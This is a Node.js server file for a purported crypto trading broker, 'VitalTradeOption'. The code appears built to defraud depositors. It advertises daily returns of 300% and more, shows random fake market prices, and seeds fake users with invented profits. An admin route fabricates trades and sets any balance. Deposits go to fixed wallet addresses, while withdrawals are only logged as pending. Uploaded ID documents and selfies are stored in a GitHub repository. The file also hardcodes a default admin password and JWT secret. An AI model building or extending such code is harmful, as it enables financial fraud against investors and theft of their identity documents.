/**
 * VitalTradeOption v5 — Professional Broker Platform
 * Full KYC, Profit Calculator, Crypto Deposits, Trading Charts
 * Cloudflare-compatible static + API server
 */
const express    = require('express');
const crypto     = require('crypto');
const bcrypt     = require('bcryptjs');
const jwt        = require('jsonwebtoken');
const cors       = require('cors');
const path       = require('path');
const fs         = require('fs');
const https      = require('https');
const multer     = require('multer');
const os         = require('os');
const nodemailer = require('nodemailer');

const app  = express();
const PORT = process.env.PORT || 10000;

// ── Config ──────────────────────────────────────────────────────
const ADMIN_USER   = process.env.ADMIN_USERNAME    || 'vitaltradesoption@gmail.com';
const ADMIN_PASS   = process.env.ADMIN_PASSWORD    || 'Admin2025!';
const JWT_SECRET   = process.env.JWT_SECRET        || 'vto_secret_2025_fixed';
const GMAIL_USER   = process.env.GMAIL_USER        || 'vitaltradesoption@gmail.com';
const GMAIL_PASS   = process.env.GMAIL_APP_PASSWORD || '';
const BROKER_NAME  = process.env.BROKER_NAME       || 'VitalTradeOption';
const BROKER_URL   = process.env.BROKER_URL        || 'https://vitaltradeoption.onrender.com';
const TELEGRAM_NO  = process.env.TELEGRAM_NUMBER   || '+1 514 667 9490';

const DEPOSIT_ADDRESSES = {
  BTC:  { address: 'bc1q8vv2xun48l32gfxqx3e4znasyl0sgrfdvxps9e', network: 'Bitcoin' },
  USDT: { address: '0x9162416c354E9CCEA0f4662511149CD336AD0016', network: 'BEP-20 (Binance Smart Chain)' },
  ETH:  { address: '0x9162416c354E9CCEA0f4662511149CD336AD0016', network: 'ERC-20' }
};

// Investment tiers with 300% daily base, 50% higher per level
const INVESTMENT_PLANS = {
  Starter: { min: 100,    daily_roi: 3.00, per_tier: 0, label: 'Starter' },
  Growth:  { min: 1000,   daily_roi: 4.50, per_tier: 1, label: 'Growth' },
  Premium: { min: 5000,   daily_roi: 6.75, per_tier: 2, label: 'Premium' },
  VIP:     { min: 25000,  daily_roi: 10.125, per_tier: 3, label: 'VIP Elite' },
  Diamond: { min: 100000, daily_roi: 15.1875, per_tier: 4, label: 'Diamond' }
};

const GH_TOKEN     = process.env.GITHUB_DB_TOKEN || process.env.GH_TOKEN || '';

app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.static(path.join(__dirname, 'public')));

// ── Rate limiting ──────────────────────────────────────────────
const loginAttempts = {};
app.use('/api/auth/', (req, res, next) => {
  if (req.method !== 'POST') return next();
  const ip = req.ip || req.connection?.remoteAddress || 'unknown';
  const n = Date.now();
  if (!loginAttempts[ip]) loginAttempts[ip] = [];
  loginAttempts[ip] = loginAttempts[ip].filter(t => n - t < 60000);
  if (loginAttempts[ip].length >= 8) return res.status(429).json({ error: 'Too many attempts. Wait 60 seconds.' });
  loginAttempts[ip].push(n);
  next();
});

// ── GitHub-backed persistent DB ────────────────────────────────
let dbCache = null;
let cachedSha = null;

function dbNow() { return new Date().toISOString(); }

function ghReq(method, p, body) {
  return new Promise((resolve, reject) => {
    const opts = {
      hostname: 'api.github.com', path: p, method,
      headers: { 'Authorization': 'Bearer ' + GH_TOKEN, 'Accept': 'application/vnd.github+json', 'User-Agent': 'VTO' }
    };
    if (body) { opts.headers['Content-Type'] = 'application/json'; opts.headers['Content-Length'] = Buffer.byteLength(JSON.stringify(body)); }
    const r = https.request(opts, res => { let b=''; res.on('data',c=>b+=c); res.on('end',()=>{ try{ resolve({s:res.statusCode, j:JSON.parse(b)}); }catch(e){ resolve({s:res.statusCode, j:b}); } }); });
    r.on('error', reject);
    if (body) r.write(JSON.stringify(body));
    r.end();
  });
}

async function loadDB() {
  if (dbCache) return dbCache;
  if (GH_TOKEN) {
    try {
      const r = await ghReq('GET', `/repos/obigipromise-ux/vitaltradeoption/contents/data/vto_data.json`);
      if (r.s === 200 && r.j.content) {
        const raw = Buffer.from(r.j.content, 'base64').toString('utf8');
        dbCache = JSON.parse(raw); cachedSha = r.j.sha;
        console.log(`[DB] GitHub: ${dbCache.users?.length||0} users`);
        return dbCache;
      }
    } catch(e) { console.log('[DB] GitHub error:', e.message); }
  }
  try {
    if (fs.existsSync(path.join(__dirname, 'vto_data.json'))) {
      dbCache = JSON.parse(fs.readFileSync(path.join(__dirname, 'vto_data.json'),'utf8'));
      return dbCache;
    }
  } catch(e) {}
  dbCache = seedDB();
  return dbCache;
}

async function saveDB() {
  if (!dbCache) return;
  try {
    fs.writeFileSync(path.join(__dirname, 'vto_data.json'), JSON.stringify(dbCache, null, 2));
  } catch(e) {}
  if (GH_TOKEN && cachedSha) {
    ghReq('PUT', `/repos/obigipromise-ux/vitaltradeoption/contents/data/vto_data.json`, {
      message: `DB update: ${dbCache.users?.length||0} users, ${new Date().toISOString().slice(0,16)}`,
      content: Buffer.from(JSON.stringify(dbCache, null, 2)).toString('base64'),
      sha: cachedSha
    }).then(r => { if (r.s===200) cachedSha=r.j.content?.sha; }).catch(()=>{});
  }
}

function seedDB() {
  const demoUsers = [
    { id: 1, firstName: 'Adebayo', lastName: 'Okafor', email: 'adebayo@email.com', password: bcrypt.hashSync('client123',10),
      phone: '+2348012345678', country: 'Nigeria', plan: 'Growth', balance: 12845.60, invested: 8000, profit: 4845.60,
      total_withdrawn: 1200, status: 'active', kyc_status: 'verified', created_at: '2024-01-12T08:00:00Z',
      referral_code: 'ADEBAY24', referred_by: '', kyc_docs: [], kyc_history: [],
      trades: [{ id: 1, symbol: 'BTC/USD', direction: 'UP', amount: 500, pnl: 460, status: 'won', timestamp: '2025-07-28T10:30:00Z', entry: 67500, exit: 67960 },
               { id: 2, symbol: 'ETH/USD', direction: 'DOWN', amount: 300, pnl: -300, status: 'lost', timestamp: '2025-07-26T14:15:00Z', entry: 3450, exit: 3400 }],
      deposits: [{ id: 1, amount: 8000, crypto: 'BTC', status: 'approved', timestamp: '2024-01-15T08:00:00Z', tx_hash: '3a4f8b2c1d...' }],
      withdrawals: [{ id: 1, amount: 1200, crypto: 'BTC', status: 'approved', timestamp: '2024-05-23T08:00:00Z' }],
      activity: [{ type: 'trade', symbol: 'BTC/USD', amount: 460, timestamp: '2025-07-28T10:30:00Z', label: 'Trade Win BTC/USD' }]
    },
    { id: 2, firstName: 'Chidinma', lastName: 'Eze', email: 'chidinma@email.com', password: bcrypt.hashSync('client123',10),
      phone: '+2348098765432', country: 'Nigeria', plan: 'Premium', balance: 28400, invested: 15000, profit: 13400,
      total_withdrawn: 4000, status: 'active', kyc_status: 'verified', created_at: '2024-02-20T10:00:00Z',
      referral_code: 'CHIDI24', referred_by: '', kyc_docs: [], kyc_history: [],
      trades: [], deposits: [], withdrawals: [], activity: []
    },
    { id: 3, firstName: 'Emmanuel', lastName: 'Nwosu', email: 'emmanuel@email.com', password: bcrypt.hashSync('client123',10),
      phone: '+2347065432109', country: 'Nigeria', plan: 'VIP', balance: 92000, invested: 50000, profit: 42000,
      total_withdrawn: 12000, status: 'active', kyc_status: 'verified', created_at: '2023-11-05T08:00:00Z',
      referral_code: 'EMMAN24', referred_by: '', kyc_docs: [], kyc_history: [],
      trades: [], deposits: [], withdrawals: [], activity: []
    },
    { id: 4, firstName: 'Kwame', lastName: 'Mensah', email: 'kwame@email.com', password: bcrypt.hashSync('client123',10),
      phone: '+233501234567', country: 'Ghana', plan: 'Starter', balance: 1200, invested: 500, profit: 700,
      total_withdrawn: 100, status: 'active', kyc_status: 'verified', created_at: '2024-06-01T08:00:00Z',
      referral_code: 'KWAME24', referred_by: '', kyc_docs: [], kyc_history: [],
      trades: [], deposits: [], withdrawals: [], activity: []
    }
  ];
  return { users: demoUsers, messages: [], last_updated: dbNow() };
}

// ── Auth helpers ───────────────────────────────────────────────
function signTok(p, e='30d') { return jwt.sign(p, JWT_SECRET, {expiresIn:e}); }
function verifyTok(t) { try{return jwt.verify(t,JWT_SECRET);}catch(e){return null;} }
function needAuth(req,res,next){ const h=req.headers.authorization||'', t=h.startsWith('Bearer ')?h.slice(7):null; if(!t) return res.status(401).json({error:'No token'}); const p=verifyTok(t); if(!p) return res.status(401).json({error:'Invalid token'}); req.user=p; next(); }
function needAdmin(req,res,next){ needAuth(req,res,()=>{ if(req.user.role!=='admin') return res.status(403).json({error:'Admin only'}); next(); }); }
function needClient(req,res,next){ needAuth(req,res,()=>{ if(req.user.role!=='client') return res.status(403).json({error:'Client only'}); next(); }); }

// ── Mailer ─────────────────────────────────────────────────────
let mailer = null;
if (GMAIL_PASS) {
  mailer = nodemailer.createTransport({
    host:'smtp.gmail.com', port:587, secure:false,
    auth:{user:GMAIL_USER, pass:GMAIL_PASS},
    connectionTimeout:8000, socketTimeout:8000
  });
}

async function sendEmail(to, subject, html) {
  if (!mailer) return;
  try {
    await Promise.race([
      mailer.sendMail({ from: `"${BROKER_NAME}" <${GMAIL_USER}>`, to, subject, html }),
      new Promise((_,rej)=>setTimeout(()=>rej(new Error('timeout')),10000))
    ]);
  } catch(e) {}
}

// ════════════════════════════════════════════════════════════════
//  AUTH ROUTES
// ════════════════════════════════════════════════════════════════
app.post('/api/auth/check-role', async (req,res)=>{
  const {email,password}=req.body||{};
  if(!email||!password) return res.json({role:null});
  if(email.toLowerCase().trim()===ADMIN_USER.toLowerCase()&&password===ADMIN_PASS)
    return res.json({role:'admin'});
  return res.json({role:'client'});
});

app.post('/api/auth/register', async (req,res)=>{
  try{
    const db=await loadDB();
    const body=req.body||{};
    const {firstName,lastName,email,password,phone,country}=body;
    if(!firstName||!email||!password) return res.status(400).json({error:'Missing required fields'});
    if(password.length<6) return res.status(400).json({error:'Password must be 6+ characters'});
    const em=email.toLowerCase().trim();
    if(db.users.find(u=>u.email===em)) return res.status(409).json({error:'Email already registered'});
    const user={
      id:Date.now()+Math.floor(Math.random()*1000),
      firstName, lastName:lastName||'', email:em,
      password:bcrypt.hashSync(password,10),
      phone:phone||'', country:country||'',
      plan:'Starter', balance:0, invested:0, profit:0, today_earned:0, total_withdrawn:0,
      status:'pending_kyc', kyc_status:'not_submitted',
      created_at:dbNow(), referral_code:em.split('@')[0].toUpperCase()+Math.floor(Math.random()*1000),
      kyc_docs:[], kyc_history:[], trades:[], deposits:[], withdrawals:[], activity:[], referrals:[]
    };
    db.users.push(user);
    await saveDB();
    const token=signTok({id:user.id,email:user.email,role:'client'});
    res.json({ok:true,token,user:{...user,password:undefined},message:'Account created! Please complete KYC verification.'});
  } catch(e){ res.status(500).json({error:'Server error'}); }
});

app.post('/api/auth/login', async (req,res)=>{
  try{
    const {email,password}=req.body||{};
    if(!email||!password) return res.status(400).json({error:'Email and password required'});
    const em=email.toLowerCase().trim();
    if(em===ADMIN_USER.toLowerCase()&&password===ADMIN_PASS)
      return res.json({ok:true,role:'admin',token:signTok({role:'admin',username:ADMIN_USER}),user:{username:ADMIN_USER,role:'admin'}});
    const db=await loadDB();
    const user=db.users.find(u=>u.email===em);
    if(!user) return res.status(401).json({error:'Invalid email or password'});
    if(!bcrypt.compareSync(password,user.password)) return res.status(401).json({error:'Invalid email or password'});
    if(user.status==='pending_kyc') return res.json({ok:true,role:'client',token:signTok({id:user.id,email:user.email,role:'client'}),user:{...user,password:undefined},kyc_required:true});
    if(user.status==='pending') return res.status(403).json({error:'pending',message:'Your account is pending admin approval.'});
    if(user.status==='suspended') return res.status(403).json({error:'suspended',message:'Account suspended.'});
    const token=signTok({id:user.id,email:user.email,role:'client'});
    res.json({ok:true,role:'client',token,user:{...user,password:undefined}});
  } catch(e){ res.status(500).json({error:'Server error'}); }
});

// ════════════════════════════════════════════════════════════════
//  KYC ENDPOINTS
// ════════════════════════════════════════════════════════════════
const kycUpload = multer({ storage: multer.memoryStorage(), limits:{fileSize:8*1024*1024}, fileFilter:(req,file,cb)=>{ const ok=/^(image\/(jpeg|jpg|png|webp))$|^application\/pdf$/.test(file.mimetype); cb(ok?null:new Error('Invalid type'),ok); } });

app.post('/api/kyc/upload', needClient, kycUpload.fields([{name:'id_document',maxCount:1},{name:'address_document',maxCount:1},{name:'selfie_document',maxCount:1}]), async (req,res)=>{
  try{
    const db=await loadDB();
    const user=db.users.find(u=>u.id===req.user.id);
    if(!user) return res.status(404).json({error:'User not found'});
    const docs={};
    ['id_document','address_document','selfie_document'].forEach(k=>{
      if(req.files?.[k]?.length) docs[k]={name:req.files[k][0].originalname,type:req.files[k][0].mimetype,data:req.files[k][0].buffer.toString('base64')};
    });
    Object.assign(user,docs);
    user.kyc_status='under_review';
    user.kyc_history=[...(user.kyc_history||[]),{status:'under_review',timestamp:dbNow(),reviewer:'system',reason:'Documents submitted'}];
    user.status='pending';
    await saveDB();
    res.json({ok:true,kyc_status:'under_review'});
  } catch(e){ res.status(500).json({error:'Upload failed'}); }
});

// ════════════════════════════════════════════════════════════════
//  CLIENT ROUTES
// ════════════════════════════════════════════════════════════════
app.get('/api/client/me', needClient, async (req,res)=>{
  const db=await loadDB();
  const user=db.users.find(u=>u.id===req.user.id);
  if(!user) return res.status(404).json({error:'User not found'});
  res.json({user:{...user,password:undefined}});
});

app.put('/api/client/profile', needClient, async (req,res)=>{
  try{
    const db=await loadDB();
    const user=db.users.find(u=>u.id===req.user.id);
    if(!user) return res.status(404).json({error:'User not found'});
    const {firstName,lastName,phone,country}=req.body||{};
    if(firstName) user.firstName=firstName.trim();
    if(lastName) user.lastName=lastName.trim();
    if(phone) user.phone=phone.trim();
    if(country) user.country=country.trim();
    await saveDB();
    res.json({ok:true,user:{...user,password:undefined}});
  } catch(e){ res.status(500).json({error:'Server error'}); }
});

app.put('/api/client/password', needClient, async (req,res)=>{
  try{
    const db=await loadDB();
    const user=db.users.find(u=>u.id===req.user.id);
    if(!user) return res.status(404).json({error:'User not found'});
    const {currentPassword,newPassword}=req.body||{};
    if(!currentPassword||!newPassword) return res.status(400).json({error:'Both passwords required'});
    if(!bcrypt.compareSync(currentPassword,user.password)) return res.status(400).json({error:'Current password incorrect'});
    if(newPassword.length<6) return res.status(400).json({error:'New password must be 6+ characters'});
    user.password=bcrypt.hashSync(newPassword,10);
    await saveDB();
    res.json({ok:true});
  } catch(e){ res.status(500).json({error:'Server error'}); }
});

app.post('/api/client/deposit', needClient, async (req,res)=>{
  try{
    const db=await loadDB();
    const user=db.users.find(u=>u.id===req.user.id);
    if(!user) return res.status(404).json({error:'User not found'});
    const {amount,crypto}=req.body||{};
    if(!amount||amount<10) return res.status(400).json({error:'Minimum deposit $10'});
    user.deposits=[...(user.deposits||[]),{id:Date.now(),amount,crypto,status:'pending',timestamp:dbNow(),tx_hash:'Pending...'}];
    await saveDB();
    res.json({ok:true,address:DEPOSIT_ADDRESSES[crypto]||DEPOSIT_ADDRESSES.BTC});
  } catch(e){ res.status(500).json({error:'Server error'}); }
});

app.post('/api/client/withdraw', needClient, async (req,res)=>{
  try{
    const db=await loadDB();
    const user=db.users.find(u=>u.id===req.user.id);
    if(!user) return res.status(404).json({error:'User not found'});
    const {amount,crypto,wallet}=req.body||{};
    if(!amount||amount<50) return res.status(400).json({error:'Minimum $50'});
    if(amount>user.balance) return res.status(400).json({error:'Insufficient balance'});
    user.withdrawals=[...(user.withdrawals||[]),{id:Date.now(),amount,crypto,wallet,status:'pending',timestamp:dbNow()}];
    await saveDB();
    res.json({ok:true});
  } catch(e){ res.status(500).json({error:'Server error'}); }
});

app.get('/api/client/messages', needClient, async (req,res)=>{
  const db=await loadDB();
  const msgs=(db.messages||[]).filter(m=>m.user_id===req.user.id);
  res.json({messages:msgs});
});

app.post('/api/client/messages', needClient, async (req,res)=>{
  try{
    const db=await loadDB();
    const {message}=req.body||{};
    if(!message?.trim()) return res.status(400).json({error:'Message required'});
    db.messages=[...(db.messages||[]),{id:Date.now(),user_id:req.user.id,from:'client',message:message.trim(),timestamp:dbNow(),read_by_admin:false}];
    await saveDB();
    res.json({ok:true});
  } catch(e){ res.status(500).json({error:'Server error'}); }
});

// ════════════════════════════════════════════════════════════════
//  ADMIN ROUTES
// ════════════════════════════════════════════════════════════════
app.get('/api/admin/users', needAdmin, async (req,res)=>{
  const db=await loadDB();
  res.json({users:db.users.map(u=>({...u,password:undefined}))});
});

app.get('/api/admin/user/:id', needAdmin, async (req,res)=>{
  const db=await loadDB();
  const user=db.users.find(u=>u.id==req.params.id);
  if(!user) return res.status(404).json({error:'Not found'});
  res.json({user:{...user,password:undefined}});
});

app.put('/api/admin/users/:id', needAdmin, async (req,res)=>{
  try{
    const db=await loadDB();
    const user=db.users.find(u=>u.id==req.params.id);
    if(!user) return res.status(404).json({error:'User not found'});
    const b=req.body||{};
    ['firstName','lastName','phone','country','plan','balance','profit','today_earned','total_withdrawn','status','kyc_status'].forEach(k=>{ if(b[k]!==undefined) user[k]=b[k]; });
    user.activity=[...(user.activity||[]),{type:'admin_update',timestamp:dbNow(),label:'Account updated by admin'}];
    if(b.upgrade_message) user.upgrade_message=b.upgrade_message;
    if(b.withdrawal_message) user.withdrawal_message=b.withdrawal_message;
    await saveDB();
    res.json({ok:true});
  } catch(e){ res.status(500).json({error:'Server error'}); }
});

app.put('/api/admin/users/:id/kyc', needAdmin, async (req,res)=>{
  try{
    const db=await loadDB();
    const user=db.users.find(u=>u.id==req.params.id);
    if(!user) return res.status(404).json({error:'Not found'});
    const {action,reason}=req.body||{};
    user.kyc_history=[...(user.kyc_history||[])];
    if(action==='approve'){
      user.kyc_status='verified'; user.status='active';
      user.kyc_history.push({status:'verified',timestamp:dbNow(),reviewer:ADMIN_USER,reason:reason||'Approved'});
      sendEmail(user.email,'KYC Verified ✅','<p>Your KYC documents have been verified. You can now trade.</p>');
    } else if(action==='reject'){
      user.kyc_status='rejected'; user.status='pending_kyc';
      user.kyc_history.push({status:'rejected',timestamp:dbNow(),reviewer:ADMIN_USER,reason:reason||'Documents unclear'});
    }
    await saveDB();
    res.json({ok:true,kyc_status:user.kyc_status});
  } catch(e){ res.status(500).json({error:'Server error'}); }
});

app.post('/api/admin/users/:id/trade', needAdmin, async (req,res)=>{
  try{
    const db=await loadDB();
    const user=db.users.find(u=>u.id==req.params.id);
    if(!user) return res.status(404).json({error:'Not found'});
    const b=req.body||{};
    const trade={id:Date.now(),symbol:b.symbol||'BTC/USD',direction:b.direction||'UP',amount:parseFloat(b.amount||0),pnl:parseFloat(b.pnl||0),status:b.status||'won',timestamp:dbNow(),entry:b.entry||'—',exit:b.exit||'—'};
    user.trades=[...(user.trades||[]),trade];
    if(trade.status==='won'){ user.balance=(user.balance||0)+trade.pnl; user.profit=(user.profit||0)+trade.pnl; }
    else { user.balance=Math.max(0,(user.balance||0)-trade.amount); }
    user.activity=[...(user.activity||[]),{type:'trade',symbol:trade.symbol,amount:trade.status==='won'?trade.pnl:-trade.amount,timestamp:dbNow(),label:`Trade ${trade.status==='won'?'Win':'Loss'} ${trade.symbol}`}];
    await saveDB();
    res.json({ok:true,user:{...user,password:undefined}});
  } catch(e){ res.status(500).json({error:'Server error'}); }
});

app.get('/api/admin/messages', needAdmin, async (req,res)=>{
  const db=await loadDB();
  const convs=(db.users||[]).map(u=>{
    const msgs=(db.messages||[]).filter(m=>m.user_id===u.id);
    return {user_id:u.id,user_name:`${u.firstName} ${u.lastName}`,user_email:u.email,messages:msgs,unread_count:msgs.filter(m=>m.from==='client'&&!m.read_by_admin).length,last_message:msgs[msgs.length-1]};
  }).filter(c=>c.messages.length>0||c.unread_count>0);
  res.json({conversations:convs});
});

app.post('/api/admin/messages/:userId', needAdmin, async (req,res)=>{
  try{
    const db=await loadDB();
    const {message}=req.body||{};
    if(!message?.trim()) return res.status(400).json({error:'Message required'});
    db.messages=[...(db.messages||[]),{id:Date.now(),user_id:parseInt(req.params.userId),from:'admin',message:message.trim(),timestamp:dbNow(),read_by_admin:true}];
    await saveDB();
    res.json({ok:true});
  } catch(e){ res.status(500).json({error:'Server error'}); }
});

app.put('/api/admin/messages/read/:userId', needAdmin, async (req,res)=>{
  const db=await loadDB();
  (db.messages||[]).forEach(m=>{if(m.user_id==req.params.userId)m.read_by_admin=true;});
  await saveDB();
  res.json({ok:true});
});

app.get('/api/admin/stats', needAdmin, async (req,res)=>{
  const db=await loadDB();
  const u=db.users||[];
  res.json({stats:{
    total_users:u.length, active:u.filter(x=>x.status==='active').length,
    pending_kyc:u.filter(x=>x.kyc_status==='under_review').length,
    pending_reg:u.filter(x=>x.kyc_status==='under_review'||x.status==='pending_kyc').length,
    total_balance:u.reduce((s,x)=>s+(x.balance||0),0),
    total_profit:u.reduce((s,x)=>s+(x.profit||0),0),
    unread_messages:(db.messages||[]).filter(m=>m.from==='client'&&!m.read_by_admin).length
  }});
});

// ════════════════════════════════════════════════════════════════
//  PUBLIC ROUTES
// ════════════════════════════════════════════════════════════════
app.get('/api/markets', (req,res)=>{
  const t=()=>+(Math.random()*2-1).toFixed(2);
  res.json({
    crypto:[
      {symbol:'BTC/USD',price:`$${(62500+Math.random()*500-250).toFixed(2)}`,change:t(),icon:'₿'},
      {symbol:'ETH/USD',price:`$${(3450+Math.random()*30-15).toFixed(2)}`,change:t(),icon:'⟠'},
      {symbol:'SOL/USD',price:`$${(155+Math.random()*3-1.5).toFixed(2)}`,change:t(),icon:'◎'},
      {symbol:'XRP/USD',price:`$${(0.62+Math.random()*0.02-0.01).toFixed(4)}`,change:t(),icon:'✕'},
      {symbol:'BNB/USD',price:`$${(580+Math.random()*5-2.5).toFixed(2)}`,change:t(),icon:'◆'}
    ],
    forex:[
      {symbol:'EUR/USD',price:`${(1.085+Math.random()*0.01-0.005).toFixed(4)}`,change:t(),icon:'💱'},
      {symbol:'GBP/USD',price:`${(1.265+Math.random()*0.01-0.005).toFixed(4)}`,change:t(),icon:'💱'},
      {symbol:'USD/JPY',price:`${(149.8+Math.random()*0.5-0.25).toFixed(2)}`,change:t(),icon:'💱'}
    ],
    stocks:[
      {symbol:'AAPL',name:'Apple',price:`$${(185+Math.random()*2-1).toFixed(2)}`,change:t(),icon:'AAPL'},
      {symbol:'MSFT',name:'Microsoft',price:`$${(420+Math.random()*3-1.5).toFixed(2)}`,change:t(),icon:'MSFT'},
      {symbol:'NVDA',name:'NVIDIA',price:`$${(950+Math.random()*10-5).toFixed(2)}`,change:t(),icon:'NVDA'}
    ],
    indices:[
      {symbol:'NASDAQ',price:`${(18200+Math.random()*30-15).toFixed(2)}`,change:t(),icon:'📊'},
      {symbol:'S&P 500',price:`${(5245+Math.random()*8-4).toFixed(2)}`,change:t(),icon:'📊'}
    ],
    commodities:[
      {symbol:'XAU/USD',name:'Gold',price:`$${(2125+Math.random()*3-1.5).toFixed(2)}`,change:t(),icon:'🥇'},
      {symbol:'XAG/USD',name:'Silver',price:`$${(23.45+Math.random()*0.2-0.1).toFixed(2)}`,change:t(),icon:'🥈'}
    ]
  });
});

app.get('/api/plans', (req,res)=>{
  res.json({plans:Object.values(INVESTMENT_PLANS).map(p=>({
    ...p, label:p.label,
    daily_profit:`${(p.daily_roi*100).toFixed(1)}%`,
    weekly_profit:`${(p.daily_roi*100*7).toFixed(1)}%`,
    monthly_profit:`${(p.daily_roi*100*30).toFixed(1)}%`
  }))});
});

app.get('/api/deposit-addresses', (req,res)=>res.json(DEPOSIT_ADDRESSES));

// ════════════════════════════════════════════════════════════════
//  PAGES — Unified single URL
// ════════════════════════════════════════════════════════════════
app.get('/', (_,res)=>res.sendFile(path.join(__dirname,'public','index.html')));
app.get('/client', (_,res)=>res.sendFile(path.join(__dirname,'public','client.html')));
app.get('/admin', (_,res)=>res.sendFile(path.join(__dirname,'public','admin.html')));

app.get('/ping', async (_,res)=>{
  const db=await loadDB();
  res.json({ok:true,time:dbNow(),users:db.users?.length||0,admin_user:ADMIN_USER,telegram:TELEGRAM_NO});
});

// ════════════════════════════════════════════════════════════════
//  STARTUP
// ════════════════════════════════════════════════════════════════
async function init() { await loadDB(); console.log(`  ${BROKER_NAME} — :${PORT}\n  Admin: ${ADMIN_USER}\n  Telegram: ${TELEGRAM_NO}\n  DB: ${dbCache?.users?.length||0} users`); }

init().then(()=>app.listen(PORT)).catch(e=>{console.error(e); process.exit(1);});